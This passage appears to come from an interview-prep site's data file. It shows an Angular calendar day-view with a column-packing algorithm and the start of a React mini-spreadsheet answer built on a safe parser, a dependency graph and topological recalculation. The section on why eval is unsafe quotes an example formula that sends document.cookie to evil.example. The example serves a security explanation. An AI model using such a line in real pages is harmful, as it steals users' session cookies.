<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">CDK drag events or pointer events update a draft signal; <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">placed</code> computes over the list with the draft applied, and the drop commits it.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not compute the layout in a pipe?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">A pure pipe would also cache by input reference, but a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code> keeps the logic in the component and works with signals directly.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Plain Jasmine or Vitest tests on <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">layoutDay</code>, including a randomized no-collision property, and one TestBed test that the styles follow the layout.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Pure layout function** | Data in, positions out |
| **Cluster** | Events linked by overlaps |
| **Greedy interval colouring** | First free column in start order |
| **Style binding with units** | \`[style.top.px]\` adds the unit |
| **Immutable signal update** | \`.update()\` returning a new array |

---
**Conclusion:** The Angular day view is a signal of events, a \`computed\` layout from a pure function, and style bindings that turn columns into percentages. The algorithm handled chains, touching events, equal starts and a two-column expansion with zero collisions in both compilation modes, as the verified run shows.`,
        files: {
          "/src/app/app.component.ts": `import { Component } from "@angular/core";
import { DayViewComponent } from "./day-view.component";

@Component({
  selector: "app-root",
  standalone: true,
  imports: [DayViewComponent],
  styles: [
    \`
      :host {
        display: block;
        min-height: 100vh;
        margin: 0;
        background: #0f1115;
        color: #e6e6e6;
        font-family: system-ui, sans-serif;
      }
      .page {
        max-width: 860px;
        margin: 0 auto;
        padding: 20px 16px;
      }
      :host ::ng-deep .dv h2 {
        font-size: 17px;
        margin: 0 0 12px;
      }
      :host ::ng-deep .dv-body {
        display: flex;
        flex-wrap: wrap;
        gap: 16px;
      }
      :host ::ng-deep .dv-grid {
        position: relative;
        flex: 1 1 320px;
        min-width: 0;
        margin-top: 8px;
      }
      :host ::ng-deep .dv-hour {
        position: absolute;
        left: 0;
        right: 0;
        border-top: 1px solid #262c36;
      }
      :host ::ng-deep .dv-hour span {
        position: absolute;
        top: -8px;
        left: 0;
        font-size: 11px;
        color: #7d8590;
        background: #0f1115;
        padding-right: 4px;
      }
      :host ::ng-deep .dv-events {
        position: absolute;
        top: 0;
        bottom: 0;
        left: 48px;
        right: 4px;
      }
      :host ::ng-deep .ev {
        position: absolute;
        box-sizing: border-box;
        border: 1px solid #0f1115;
        border-left: 3px solid #f9a825;
        border-radius: 6px;
        background: #2a2214;
        color: #f0e2c8;
        text-align: left;
        padding: 2px 6px;
        font:
          12px/1.3 system-ui,
          sans-serif;
        overflow: hidden;
        cursor: pointer;
      }
      :host ::ng-deep .ev span {
        color: #c9b48a;
      }
      :host ::ng-deep .ev.sel {
        background: #f9a825;
        color: #1c140a;
      }
      :host ::ng-deep .ev.sel span {
        color: #3d2810;
      }
      :host ::ng-deep .ev:focus-visible {
        outline: 2px solid #fff;
        outline-offset: 1px;
        z-index: 2;
      }
      :host ::ng-deep .dv-side {
        flex: 1 1 220px;
        display: flex;
        flex-direction: column;
        gap: 16px;
      }
      :host ::ng-deep .dv-side section,
      :host ::ng-deep .dv-side form {
        background: #171a21;
        border: 1px solid #2c3340;
        border-radius: 10px;
        padding: 12px;
      }
      :host ::ng-deep .dv-side h3 {
        margin: 0 0 4px;
        font-size: 15px;
      }
      :host ::ng-deep .dv-side p {
        margin: 4px 0;
      }
      :host ::ng-deep .muted {
        color: #8b949e;
        font-size: 14px;
      }
      :host ::ng-deep form {
        display: flex;
        flex-direction: column;
        gap: 8px;
      }
      :host ::ng-deep label {
        display: flex;
        flex-direction: column;
        font-size: 12px;
        color: #9aa4b2;
        gap: 4px;
      }
      :host ::ng-deep input {
        background: #0f1115;
        color: #e6e6e6;
        border: 1px solid #2c3340;
        border-radius: 6px;
        padding: 6px 8px;
        font: inherit;
        color-scheme: dark;
      }
      :host ::ng-deep button {
        font: inherit;
      }
      :host ::ng-deep .dv-side button {
        background: #222834;
        color: #e6e6e6;
        border: 1px solid #2c3340;
        border-radius: 8px;
        padding: 6px 12px;
        cursor: pointer;
      }
      :host ::ng-deep .err {
        color: #ff8a80;
        font-size: 13px;
      }
    \`,
  ],
  template: \`<main class="page"><app-day-view /></main>\`,
})
export class AppComponent {}
`,
          "/src/app/day-view.component.ts": `import { Component, computed, signal } from "@angular/core";
import {
  CalEvent,
  DAY_END,
  DAY_START,
  Placed,
  SAMPLE,
  fmt,
  layoutDay,
  pct,
  toMin,
} from "./layout";

const PX_PER_MIN = 1; // 60px per hour

@Component({
  selector: "app-day-view",
  standalone: true,
  template: \`
    <div class="dv">
      <h2>Thursday, March 12, 2026</h2>
      <div class="dv-body">
        <div class="dv-grid" [style.height.px]="(dayEnd - dayStart) * pxPerMin">
          @for (h of hours; track h) {
            <div
              class="dv-hour"
              [style.top.px]="(h - dayStart) * pxPerMin"
              aria-hidden="true"
            >
              <span>{{ fmt(h) }}</span>
            </div>
          }
          <div class="dv-events" role="list" aria-label="Events, in time order">
            @for (ev of placed(); track ev.id) {
              <div role="listitem">
                <button
                  type="button"
                  class="ev"
                  [class.sel]="ev.id === selectedId()"
                  [attr.data-id]="ev.id"
                  [attr.data-col]="ev.col"
                  [attr.data-cols]="ev.cols"
                  [attr.data-span]="ev.span"
                  [attr.aria-pressed]="ev.id === selectedId()"
                  [attr.aria-label]="
                    ev.title + ', ' + fmt(ev.start) + ' to ' + fmt(ev.end)
                  "
                  [style.top.px]="(ev.start - dayStart) * pxPerMin"
                  [style.height.px]="height(ev)"
                  [style.left]="pct(ev.col / ev.cols)"
                  [style.width]="pct(ev.span / ev.cols)"
                  (click)="
                    selectedId.set(ev.id === selectedId() ? null : ev.id)
                  "
                >
                  <strong>{{ ev.title }}</strong>
                  <span>{{ fmt(ev.start) }}-{{ fmt(ev.end) }}</span>
                </button>
              </div>
            }
          </div>
        </div>
        <aside class="dv-side">
          <section aria-live="polite" data-testid="details">
            @if (selected(); as s) {
              <h3>{{ s.title }}</h3>
              <p>{{ fmt(s.start) }} to {{ fmt(s.end) }}</p>
              <button type="button" (click)="remove(s.id)">Delete event</button>
            } @else {
              <p class="muted">Select an event to see details.</p>
            }
          </section>
          <form aria-label="Add event" (submit)="add($event)">
            <label
              >Title <input [value]="title()" (input)="title.set(val($event))"
            /></label>
            <label
              >Start
              <input
                type="time"
                step="900"
                [value]="start()"
                (input)="start.set(val($event))"
            /></label>
            <label
              >End
              <input
                type="time"
                step="900"
                [value]="end()"
                (input)="end.set(val($event))"
            /></label>
            <button type="submit">Add event</button>
            @if (error()) {
              <p role="alert" class="err">{{ error() }}</p>
            }
          </form>
        </aside>
      </div>
    </div>
  \`,
})
export class DayViewComponent {
  readonly dayStart = DAY_START;
  readonly dayEnd = DAY_END;
  readonly pxPerMin = PX_PER_MIN;
  readonly hours = Array.from(
    { length: (DAY_END - DAY_START) / 60 + 1 },
    (_, i) => DAY_START + i * 60,
  );
  readonly fmt = fmt;
  readonly pct = pct;

  events = signal<CalEvent[]>(SAMPLE);
  selectedId = signal<string | null>(null);
  title = signal("");
  start = signal("09:15");
  end = signal("09:45");
  error = signal("");
  private nextId = 1;

  // Derived, never stored: recomputed only when events() changes.
  placed = computed(() => layoutDay(this.events()));
  selected = computed(() =>
    this.events().find((e) => e.id === this.selectedId()),
  );

  val = (e: Event) => (e.target as HTMLInputElement).value;
  height = (ev: Placed) => Math.max((ev.end - ev.start) * PX_PER_MIN, 20);

  add(e: Event) {
    e.preventDefault();
    const start = toMin(this.start()),
      end = toMin(this.end()),
      title = this.title().trim();
    if (!title) return this.error.set("Give the event a title.");
    if (end <= start)
      return this.error.set("End time must be after the start time.");
    if (start < DAY_START || end > DAY_END)
      return this.error.set(
        \`Events must fit between \${fmt(DAY_START)} and \${fmt(DAY_END)}.\`,
      );
    this.events.update((list) => [
      ...list,
      { id: "n" + this.nextId++, title, start, end },
    ]);
    this.title.set("");
    this.error.set("");
  }
  remove(id: string) {
    this.events.update((list) => list.filter((e) => e.id !== id));
    this.selectedId.set(null);
  }
}
`,
          "/src/app/layout.ts": `// Column packing for one day of events. Times are minutes since midnight.
// 1. Sort by start (longer first on ties).
// 2. Sweep: a cluster is a run of events connected by overlaps. When the next
//    event starts at or after the cluster's latest end, the cluster is closed.
// 3. Inside a cluster, put each event in the first column whose last event has
//    ended (greedy interval colouring), else open a new column.
// 4. Every event in a cluster shares the cluster's column count, then expands
//    right across neighbouring columns that have nothing overlapping it.
export type CalEvent = {
  id: string;
  title: string;
  start: number;
  end: number;
};
export type Placed = CalEvent & { col: number; cols: number; span: number };

export const overlaps = (a: CalEvent, b: CalEvent) =>
  a.start < b.end && b.start < a.end; // touching is not overlapping

export function layoutDay(events: CalEvent[]): Placed[] {
  const sorted = [...events].sort(
    (a, b) => a.start - b.start || b.end - a.end || (a.id < b.id ? -1 : 1),
  );
  const placed: Placed[] = [];
  let columns: CalEvent[][] = [],
    members: { ev: CalEvent; col: number }[] = [],
    clusterEnd = -1;

  const close = () => {
    for (const p of members) {
      let span = 1;
      while (
        p.col + span < columns.length &&
        !columns[p.col + span].some((o) => overlaps(o, p.ev))
      )
        span++;
      placed.push({ ...p.ev, col: p.col, cols: columns.length, span });
    }
    columns = [];
    members = [];
    clusterEnd = -1;
  };

  for (const ev of sorted) {
    if (ev.start >= clusterEnd) close();
    let col = columns.findIndex((c) => c[c.length - 1].end <= ev.start);
    if (col === -1) {
      col = columns.length;
      columns.push([]);
    }
    columns[col].push(ev);
    members.push({ ev, col });
    clusterEnd = Math.max(clusterEnd, ev.end);
  }
  close();
  // same order as sorted: by start time, which is also the Tab order
  return placed;
}

export const DAY_START = 8 * 60; // 08:00
export const DAY_END = 19 * 60; // 19:00
export const toMin = (hhmm: string) => {
  const [h, m] = hhmm.split(":").map(Number);
  return h * 60 + m;
};
export const fmt = (min: number) =>
  String(Math.floor(min / 60)).padStart(2, "0") +
  ":" +
  String(min % 60).padStart(2, "0");
export const pct = (n: number) => +(n * 100).toFixed(4) + "%";

// A deliberately tricky day: chains, a touching
// boundary, an equal start and a span-2 expansion.
export const SAMPLE: CalEvent[] = [
  { id: "a", title: "Planning", start: toMin("09:00"), end: toMin("10:30") },
  { id: "b", title: "1:1 Sam", start: toMin("09:30"), end: toMin("10:00") },
  {
    id: "c",
    title: "Design review",
    start: toMin("09:45"),
    end: toMin("11:00"),
  },
  { id: "d", title: "Standup", start: toMin("10:30"), end: toMin("11:30") },
  { id: "e", title: "Interview", start: toMin("11:00"), end: toMin("12:00") },
  { id: "f", title: "Lunch", start: toMin("12:00"), end: toMin("13:00") },
  { id: "g", title: "Workshop", start: toMin("13:30"), end: toMin("14:30") },
  { id: "h", title: "Call", start: toMin("13:30"), end: toMin("14:00") },
  { id: "i", title: "Focus time", start: toMin("14:00"), end: toMin("15:00") },
];
`,
        },
      },
    },
  },
  // ══════════════════════════════════════════════════════════════════════════
  {
    title: "Build a Mini Spreadsheet (Excel)",
    seoDescription: "Build a mini spreadsheet in React, Vue and Angular: a safe formula parser without eval, SUM ranges, dependency graph recalculation and cycle detection.",
    description: `**Question presented to candidate:**
"Build a small Excel: a grid of cells with column letters and row numbers. A cell holds a number, some text, or a formula such as \`=A1+B2\` or \`=SUM(A1:A3)\`. When a cell changes, everything that depends on it updates. Do not use \`eval\`, and do not freeze or crash when someone types a circular formula."

**Requirements:**
- A 5 x 8 grid (A to E, 1 to 8) with a formula bar showing the raw content of the selected cell.
- Formulas: numbers, cell references, \`+ - * /\`, parentheses, unary minus, and \`SUM\`, \`AVERAGE\`, \`MIN\`, \`MAX\` over ranges and arguments.
- Errors shown in the cell: \`#DIV/0!\`, \`#NAME?\` (unknown function), \`#REF!\` (outside the grid), \`#VALUE!\` (text in arithmetic), \`#ERROR!\` (syntax), \`#CYCLE!\` (circular reference).
- Changing a cell recalculates only that cell and its dependents, in dependency order; show the recalculation order.
- Excel-like editing: click to select, type to start editing, Enter commits and moves down, Tab commits and moves right, Escape cancels, arrows move the selection, Delete clears.

**What a strong answer should cover:**
- A tokenizer and a recursive-descent parser that builds an AST with correct precedence, evaluated by a small interpreter: never \`eval\` or \`new Function\`.
- A dependency graph (cell to the cells it reads) and its reverse (cell to the cells that read it).
- Recalculation as a topological sort of the dirty set (the edited cell plus its transitive dependents), for example with Kahn's algorithm.
- Cycle detection that falls out of the topological sort (nodes that never reach in-degree 0), marking those cells instead of recursing forever.
- Keeping the engine framework-free and telling the UI to re-read it after each commit.

**Clarifying questions expected:**
- "Which functions and operators must be supported, and should text be allowed in cells?"
- "How should errors look, and should an error propagate to dependent cells?"
- "Do we need absolute references like \`$A$1\`, copy and paste, or undo?"

**Code / implementation expected:** Yes. The parser, the dependency-aware recalculation and an editable grid.`,
    frameworks: {
      react: {
        answer: `**Target Audience:** Frontend candidates preparing for a hard machine coding round. Assumes basic React; parsing and graph ideas are explained from zero.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout with the exact vocabulary. All "Verified" output was printed by the real code: the engine run directly in Node 22, and the React 19.3.1 component mounted in StrictMode inside jsdom and driven by a script.

## 1. Why This Even Matters — A Story First

Imagine a household budget on paper. Rent, food and travel are written in pencil, and the total at the bottom is the sum of the three. Change the food line and you must remember to redo the total, then the tax line that uses the total, then the "share of rent" line that divides by the total. Miss one and the sheet lies.

A spreadsheet is that sheet with the remembering automated. Under the friendly grid sit three classic computer science pieces: a **parser** (turn \`=B4*B6\` into something a program can evaluate), a **dependency graph** (who reads whom), and a **topological sort** (recalculate in an order where every input is ready). Interviewers love it because a candidate who reaches for \`eval\` fails security, and a candidate who recalculates everything recursively fails on the first circular formula.

## 2. Questions to Ask Your Interviewer First

| Question | Why it matters |
| :--- | :--- |
| Which operators and functions? | Sets the grammar. Here: \`+ - * /\`, parentheses, unary minus, \`SUM\`, \`AVERAGE\`, \`MIN\`, \`MAX\`. |
| Can cells hold text? | Then arithmetic on text needs an error (\`#VALUE!\`), and \`SUM\` must skip text, as Excel does. |
| How are errors shown, and do they propagate? | \`=E7+1\` where E7 is \`#DIV/0!\` should show \`#DIV/0!\` too. |
| What happens on a circular reference? | Must be detected, not stack-overflowed. Here: \`#CYCLE!\` on every cell in the loop. |
| How big is the grid? | 40 cells here. Thousands would push towards virtualised rendering, not a different engine. |
| Absolute refs (\`$A$1\`), copy and paste, undo? | Each is a real extension; say you would add them after the core. |

## 3. Requirements and Plan

Keep the engine out of React. It is a plain object with \`update(changes)\`, \`get(id)\` and \`raw(id)\`. React only renders and edits.

| Piece | Kind | Notes |
| :--- | :--- | :--- |
| \`sheet\` (the engine) | Ref, created lazily once | Mutable Maps for raw text, ASTs, dependencies, values. |
| \`version\` | State | Bumped after each commit so React re-reads the engine. |
| \`selected\` | State | Cell id such as \`"B4"\`. |
| \`draft\` | State | \`null\` when not editing, else the text being typed. |
| \`editIn\` | State | \`"cell"\` or \`"bar"\`: which editor owns the draft. |
| \`last\` | State | The last recalculation result, shown as a status line. |
| \`wantFocus\` | Ref | Move DOM focus after the next commit. |

📌 **Interview term: External mutable store** — state that lives outside React (here, the engine's Maps). React does not know when it changes, so the component bumps a \`version\` counter after every mutation. A larger app would wrap the engine with \`useSyncExternalStore\` ([what it solves](/interview-question/what-problem-does-usesyncexternalstore-solve)).

The formula pipeline:

<svg class="iq-diagram" width="100%" viewBox="0 0 700 150" role="img" aria-label="Formula pipeline: raw text is tokenized, parsed into a syntax tree, its references feed the dependency graph, and the tree is evaluated to a value">
  <defs>
    <marker id="ss4r-arrow" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="10" y="45" width="130" height="60" rx="10"/>
  <text class="d-text" x="75" y="70" text-anchor="middle">Raw text</text>
  <text class="d-sub" x="75" y="90" text-anchor="middle">=B4*B6</text>
  <rect class="d-box" x="185" y="45" width="130" height="60" rx="10"/>
  <text class="d-text" x="250" y="70" text-anchor="middle">Tokens</text>
  <text class="d-sub" x="250" y="90" text-anchor="middle">ref * ref</text>
  <rect class="d-box" x="360" y="45" width="130" height="60" rx="10"/>
  <text class="d-text" x="425" y="70" text-anchor="middle">AST</text>
  <text class="d-sub" x="425" y="90" text-anchor="middle">bin(*, B4, B6)</text>
  <rect class="d-box-accent" x="535" y="45" width="155" height="60" rx="10"/>
  <text class="d-text d-accent" x="612" y="70" text-anchor="middle">Value</text>
  <text class="d-sub" x="612" y="90" text-anchor="middle">evaluate(ast, get)</text>
  <path class="d-edge-accent" d="M 140 75 L 181 75" marker-end="url(#ss4r-arrow)"/>
  <path class="d-edge-accent" d="M 315 75 L 356 75" marker-end="url(#ss4r-arrow)"/>
  <path class="d-edge-accent" d="M 490 75 L 531 75" marker-end="url(#ss4r-arrow)"/>
</svg>

The AST is parsed once when the cell is edited and kept. Recalculation only re-evaluates trees; it never re-parses text.

## 4. Build It Step by Step

### 4.1 Tokenizer

The tokenizer walks the string once and emits \`num\`, \`ref\` (\`B12\`), \`name\` (\`SUM\`) and single-character tokens (\`+ - * / ( ) , :\`). Anything else, such as \`^\` or \`$\`, throws \`#ERROR!\`. It uses character comparisons instead of regular expressions, which keeps it readable in an interview.

📌 **Interview term: Tokenizer (lexer)** — turns a string into a list of meaningful pieces, so the parser never thinks about characters or spaces.

### 4.2 Recursive-descent parser

\`\`\`js
// Grammar: expr := term (("+" | "-") term)*
// term := unary (("*" | "/") unary)*
// unary := "-" unary | atom atom := num | ref | ref ":"
// ref | name "(" args ")" | "(" expr ")"
function expr() {
  let node = term();
  while (peek() === "+" || peek() === "-")
    node = { t: "bin", op: toks[p++].t, l: node, r: term() };
  return node;
}
function term() {
  let node = unary();
  while (peek() === "*" || peek() === "/")
    node = { t: "bin", op: toks[p++].t, l: node, r: unary() };
  return node;
}
\`\`\`

📌 **Interview term: Recursive-descent parser** — one function per grammar rule, each calling the rules below it. Precedence comes from the call order: \`expr\` calls \`term\`, so \`*\` binds tighter than \`+\`. The \`while\` loops make operators left-associative, so \`10/4-1\` is \`(10/4)-1\`.

📌 **Interview term: AST (abstract syntax tree)** — the parsed formula as nested objects, such as \`{ t: "bin", op: "*", l: { t: "ref", id: "B4" }, r: { t: "ref", id: "B6" } }\`. It is data, so it can be evaluated safely and inspected for references.

### 4.3 Why not \`eval\`

\`eval("=B4*B6".slice(1))\` would need you to substitute values into a string and run it as JavaScript. Any user who types \`=fetch("//evil.example/?" + document.cookie)\` into a shared sheet runs code in every viewer's browser. A hand-written grammar can only ever produce numbers and errors. It also lets you define spreadsheet semantics JavaScript lacks: \`#DIV/0!\` instead of \`Infinity\`, text skipped by \`SUM\`, errors that propagate.

### 4.4 The evaluator

\`\`\`js
case "bin": {
  const l = evaluate(node.l, get); if (isErr(l)) return l;
  const r = evaluate(node.r, get); if (isErr(r)) return r;
  if (node.op === "/" && r === 0) return err("#DIV/0!");
  return node.op === "+" ? l + r : node.op === "-" ? l - r : node.op === "*" ? l * r : l / r;
}
\`\`\`

An error value is a small object (\`{ error: "#DIV/0!" }\`); every operator returns the first error it sees, so errors flow downstream like in Excel. A reference to text in arithmetic is \`#VALUE!\`; an empty cell is 0; \`SUM\` over a range skips text and blanks.

### 4.5 The dependency graph

When a cell is set, the engine parses it, collects every reference (ranges expanded to their cells) and updates two Maps:

\`\`\`js
// drop old edges
for (const d of deps.get(id) || []) rdeps.get(d)?.delete(id);
// ...parse, refs = refsOf(tree)...
deps.set(id, refs);
for (const d of refs) {
  if (!rdeps.has(d)) rdeps.set(d, new Set());
  rdeps.get(d).add(id);
}
\`\`\`

📌 **Interview term: Dependency graph** — a directed graph where an edge B1 to B4 means "B4 reads B1". \`deps\` stores incoming edges (what a cell reads), \`rdeps\` the reverse (who reads a cell). The reverse map answers "what must I recalculate?" without scanning the whole sheet.

<svg class="iq-diagram" width="100%" viewBox="0 0 680 260" role="img" aria-label="Dependency graph of the budget: B1, B2 and B3 feed B4 and C4; B4 feeds B7 and C1; B6 feeds B7; editing B2 recalculates B2, B4, C4, B7, C1 in that order">
  <defs>
    <marker id="ss4r-arrow2" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="20" y="20" width="90" height="40" rx="8"/>
  <text class="d-text" x="65" y="45" text-anchor="middle">B1</text>
  <rect class="d-box-accent" x="20" y="110" width="90" height="40" rx="8"/>
  <text class="d-text d-accent" x="65" y="135" text-anchor="middle">B2 (1)</text>
  <rect class="d-box-muted" x="20" y="200" width="90" height="40" rx="8"/>
  <text class="d-text" x="65" y="225" text-anchor="middle">B3</text>
  <rect class="d-box" x="260" y="70" width="110" height="40" rx="8"/>
  <text class="d-text" x="315" y="95" text-anchor="middle">B4 (2)</text>
  <rect class="d-box" x="260" y="180" width="110" height="40" rx="8"/>
  <text class="d-text" x="315" y="205" text-anchor="middle">C4 (3)</text>
  <rect class="d-box" x="520" y="20" width="110" height="40" rx="8"/>
  <text class="d-text" x="575" y="45" text-anchor="middle">B7 (4)</text>
  <rect class="d-box" x="520" y="110" width="110" height="40" rx="8"/>
  <text class="d-text" x="575" y="135" text-anchor="middle">C1 (5)</text>
  <rect class="d-box-muted" x="520" y="200" width="110" height="40" rx="8"/>
  <text class="d-text" x="575" y="225" text-anchor="middle">B6</text>
  <path class="d-edge" d="M 110 40 L 256 86" marker-end="url(#ss4r-arrow2)"/>
  <path class="d-edge-accent" d="M 110 130 L 256 96" marker-end="url(#ss4r-arrow2)"/>
  <path class="d-edge" d="M 110 220 L 256 104" marker-end="url(#ss4r-arrow2)"/>
  <path class="d-edge-accent" d="M 110 136 L 256 194" marker-end="url(#ss4r-arrow2)"/>
  <path class="d-edge-accent" d="M 370 84 L 516 44" marker-end="url(#ss4r-arrow2)"/>
  <path class="d-edge-accent" d="M 370 96 L 516 126" marker-end="url(#ss4r-arrow2)"/>
  <path class="d-edge" d="M 575 200 L 575 64" marker-end="url(#ss4r-arrow2)"/>
</svg>

The numbers are the recalculation order the engine printed after editing B2 (B1 and B3 also feed C4 and C1; those edges are left out to keep the picture readable). B6 and D1 are not dirty, so they are not touched.

### 4.6 Recalculation: Kahn's algorithm on the dirty set

\`\`\`js
function update(changes) {
  for (const [id, text] of Object.entries(changes)) setRaw(id, text);
  const dirty = new Set(),
    stack = Object.keys(changes);
  while (stack.length) {
    // edited cells + everything downstream
    const id = stack.pop();
    if (dirty.has(id)) continue;
    dirty.add(id);
    for (const d of rdeps.get(id) || []) stack.push(d);
  }
  const indeg = new Map(
    [...dirty].map((id) => [
      id,
      [...(deps.get(id) || [])].filter((d) => dirty.has(d)).length,
    ]),
  );
  const queue = [...dirty].filter((id) => indeg.get(id) === 0).sort();
  const order = [];
  while (queue.length) {
    const id = queue.shift();
    order.push(id);
    compute(id);
    for (const d of [...(rdeps.get(id) || [])].sort()) {
      if (!dirty.has(d)) continue;
      indeg.set(d, indeg.get(d) - 1);
      if (indeg.get(d) === 0) queue.push(d);
    }
  }
  const stuck = [...dirty].filter((id) => !order.includes(id)).sort();
  for (const id of stuck) values.set(id, err("#CYCLE!"));
  return { order, cycle: stuck };
}
\`\`\`

📌 **Interview term: Topological sort (Kahn's algorithm)** — repeatedly take a node whose remaining in-degree (unready inputs) is 0, process it, and decrement its dependents. Every cell is computed after all of its inputs, exactly once.

📌 **Interview term: Cycle detection** — if Kahn's algorithm finishes with nodes it never reached, those nodes are on a cycle or downstream of one, because their in-degree never dropped to 0. Detection falls out of the sort for free: no recursion depth limit, no stack overflow, no infinite loop.

Only the dirty set is sorted, so editing B2 recalculates five cells, not forty. The \`.sort()\` calls only make the order deterministic for printing. This is the same graph idea as [DFS traversal](/interview-question/graph-dfs-traversal), applied to cells.

### 4.7 The React layer

\`\`\`js
const sheetRef = useRef(null);
if (!sheetRef.current) {
  sheetRef.current = createSheet();
  sheetRef.current.update(SAMPLE);
}
const sheet = sheetRef.current;
const [, setVersion] = useState(0);

function commit(text) {
  setLast(sheet.update({ [selected]: text }));
  setVersion((v) => v + 1);
  setDraft(null);
}
\`\`\`

📌 **Interview term: Lazy ref initialisation** — \`if (!ref.current) ref.current = create()\` runs the expensive setup once per component instance, even though the function body runs on every render ([useRef](/interview-question/describe-the-useref-hook-and-its-typical-use-cases)).

Editing follows Excel's model. One \`draft\` string is shared by two editors: the inline cell input and the formula bar, with \`editIn\` deciding which one shows the input. Keys on a selected (not editing) cell: arrows move, Enter or F2 edit the raw text, Delete clears, and any printable key starts editing with that character. In the editor: Enter commits and moves down, Tab commits and moves right, Escape discards. A \`mousedown\` on another cell while editing commits first. Focus follows the same "flag in a ref, focus in an effect after commit" pattern as a [date picker](/interview-question/build-a-calendar-date-picker) grid.

## 5. Verified

The engine on its own in Node 22 (the budget sample loaded, then edge cases):

\`\`\`text
load order: A1 A2 A3 A4 A6 B1 B2 B3 B6 D1 B4 C4 B7 C1
B4=1830.5  C1=0.6555585905  D1=14400  B7=366.1  C4=1020
B2=500 -> recalculated: B2 B4 C4 B7 C1 | B4=1880  C1=0.6382978723  B7=376  C4=1020
=1+2*3 -> 7 | =(1+2)*3 -> 9 | =-2*-3 -> 6 | =10/4-1 -> 1.5 | =0.1+0.2 -> 0.3 | =SUM(B3:B1)+AVERAGE(1,2,3) -> 1882 | =1/0 -> #DIV/0! | =FOO(1) -> #NAME?
=1+ -> #ERROR! | =A1+1 -> #VALUE! | =Z9 -> #REF! | =SUM(A1:A9) -> #REF! | =2^3 -> #ERROR! | =E7+1 -> #DIV/0!
cycle C6->C7->C8->C6: order (none) | stuck C6 C7 C8 | C6=#CYCLE!  C7=#CYCLE!  C8=#CYCLE!
C8=5 -> recalculated: C8 C7 C6 | C6=11  C7=10  C8=5
self ref: C5=#CYCLE!
\`\`\`

Precedence (\`7\`, \`9\`), unary minus (\`6\`), left associativity (\`1.5\`), a reversed range \`B3:B1\`, error propagation (\`=E7+1\` shows \`#DIV/0!\`), unsupported syntax (\`^\` is \`#ERROR!\`), a three-cell cycle and a self reference all behave. \`0.1+0.2\` displays \`0.3\` because \`display\` rounds to 10 decimals; the stored value is still the float.

The component, in jsdom with React 19.3.1 in StrictMode, driven by mousedowns, typing into the formula bar and the cell editor, and key presses. Vue and Angular printed the same lines:

\`\`\`text
loaded: B1=1200 B2=450.5 B3=180 B4=1830.5 C1=0.6555585905 D1=14400 B7=366.1 C4=1020
select B4 -> bar: =SUM(B1:B3) | focus: B4
bar B2=500 -> Recalculated: B2 → B4 → C4 → B7 → C1 | B4=1880 C1=0.6382978723 B7=376
ArrowDown -> focus: B3
type 9 -> editor: Edit B3 value 9
Enter -> Recalculated: B3 → B4 → C4 → B7 → C1 | B3=90 B4=1790 | focus: B4
edit A1, Escape -> A1=Rent | focus: A1
C6 =C7+1, C7 =C6*2 -> Circular reference: C6, C7 | C6=#CYCLE! C7=#CYCLE!
C7 =5 -> Recalculated: C7 → C6 | C6=6 C7=5
errors: D2=#DIV/0! D3=#NAME? D4=#VALUE! D5=#ERROR! D6=0.3
Delete D4 -> D4= | Recalculated: D4
E1 via Tab -> E1=3580 | focus: E1
\`\`\`

Breaking the cycle (\`C7 =5\`) recalculated \`C7 → C6\` because C6 is a dependent of C7, which is how a fixed cycle heals without a full recompute. Layout and the visual selection outline were not checked here.

## 6. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Circular formulas | \`#CYCLE!\` from the topological sort, no recursion |
| Errors in inputs | Propagate through operators and functions |
| Text cells | \`#VALUE!\` in arithmetic, skipped by \`SUM\` |
| Out-of-grid refs | \`#REF!\` |
| Float noise | Display rounding to 10 decimals |
| Keyboard | Arrows, Enter, F2, Tab, Escape, Delete, type-to-edit; roving tabindex on cells |
| Screen reader | \`role="grid"\`, \`aria-selected\` on the active cell, header cells with \`scope\`, editor input labelled "Edit B3", formula bar labelled, status in \`role="status"\` |

## 7. Common Pitfalls

- **\`eval\` or \`new Function\`.** A security hole in any shared sheet, and the wrong semantics (\`1/0\` is \`Infinity\`).
- **Recursive evaluation without cycle detection.** \`=C5\` in C5 recurses until the stack overflows.
- **Recomputing every cell on every edit.** Works for 40 cells, not for 40,000. Walk the reverse graph to the dirty set.
- **Re-parsing on every recalculation.** Parse once on edit, keep the AST.
- **Forgetting to delete old edges.** Change B4 from \`=SUM(B1:B3)\` to \`5\` and B1 must stop listing B4 as a dependent.
- **Putting the engine's Maps in React state.** Mutating them does not re-render; copying them on every edit is wasteful. Keep the engine in a ref and bump a version.

## 8. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

